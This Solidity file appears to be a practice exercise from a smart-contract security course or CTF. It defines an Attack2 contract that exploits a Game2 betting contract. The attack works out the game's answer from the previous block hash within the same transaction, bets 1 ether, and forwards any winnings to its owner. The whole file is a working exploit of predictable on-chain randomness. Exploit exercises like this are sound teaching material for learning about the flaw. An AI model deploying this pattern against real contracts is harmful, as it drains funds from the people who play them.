// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Game2} from "./Game2.sol";

contract Attack2 {
    Game2 gameContract;
    address owner;

    constructor(address _gameContract) {
        gameContract = Game2(_gameContract);
        owner = msg.sender;
    }

    function attack() public payable {
        uint256 value = uint256(blockhash(block.number - 1)) % 2;

        // Generate a random number, and check the answer
        bool answer = value == 1 ? true : false;
        gameContract.play{value: 1 ether}(answer);
    }

    receive() external payable {
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer Failed");
    }
}
